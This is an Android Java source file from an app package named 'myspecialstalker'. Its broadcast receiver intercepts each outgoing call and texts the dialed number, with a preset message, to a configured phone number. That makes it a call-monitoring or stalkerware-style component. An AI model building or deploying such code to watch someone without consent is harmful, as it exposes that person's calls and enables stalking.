package com.image.get.myspecialstalker;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import static com.image.get.myspecialstalker.Notifications.Notifications_do;
import static com.image.get.myspecialstalker.Notifications.send_message;


public class StartedOutgoingCalls extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction()))
        {
            String calledNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (MainActivity.isReadyToSend())
            {
                String messageToSend = MainActivity.getCurrentMessage() + calledNumber;
                Notifications_do("sending message...", context);
                send_message(MainActivity.getCurrentPhoneNumber(), messageToSend, context);
            }
        }
    }


}
